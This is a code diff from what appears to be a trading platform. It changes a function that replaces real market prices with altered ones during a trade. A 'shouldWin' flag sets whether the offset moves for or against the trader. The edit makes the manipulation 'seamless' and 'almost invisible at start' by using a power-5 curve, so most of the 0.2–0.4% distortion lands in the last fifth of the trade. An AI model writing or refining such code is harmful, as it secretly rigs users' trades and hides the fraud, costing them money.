@@ -941,20 +941,12 @@
       const elapsed = now - manipulation.startTime;
       const progress = Math.min(elapsed / manipulation.duration, 1);
       
-      // === SMOOTH MANIPULATION ===
-      // First 50% of trade: no manipulation
-      const warmupDuration = manipulation.duration * 0.5;
+      // === SEAMLESS MANIPULATION ===
+      // Offset grows from start but VERY slowly at first (power 5)
+      // At 50% progress: only ~3% of max offset applied
+      // Most of the offset happens in last 20% of trade
       
-      if (elapsed < warmupDuration) {
-        // Pure market data
-        manipulation.lastManipulatedPrice = realPrice;
-        return realPrice;
-      }
-      
-      // Last 50%: smooth gradual offset
-      const manipulationProgress = (elapsed - warmupDuration) / (manipulation.duration * 0.5);
-      
-      // Working offset: 0.2-0.4% - enough to determine WIN/LOSS
+      // Working offset: 0.2-0.4%
       const maxChangePercent = 0.002 + (manipulation.duration / 300000) * 0.002;
       const maxChange = manipulation.entryPrice * maxChangePercent;
       
@@ -962,8 +954,12 @@
       const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
       const actualDirection = manipulation.shouldWin ? favorableDirection : -favorableDirection;
       
-      // Smooth curve - power of 3 for gradual start
-      const smoothCurve = Math.pow(manipulationProgress, 3);
+      // Ultra smooth curve - power 5: almost invisible at start
+      // progress 0.2 -> 0.00032 (0.03%)
+      // progress 0.5 -> 0.03125 (3%)
+      // progress 0.8 -> 0.32768 (33%)
+      // progress 1.0 -> 1.0 (100%)
+      const smoothCurve = Math.pow(progress, 5);
       
       const offset = maxChange * smoothCurve * actualDirection;
       
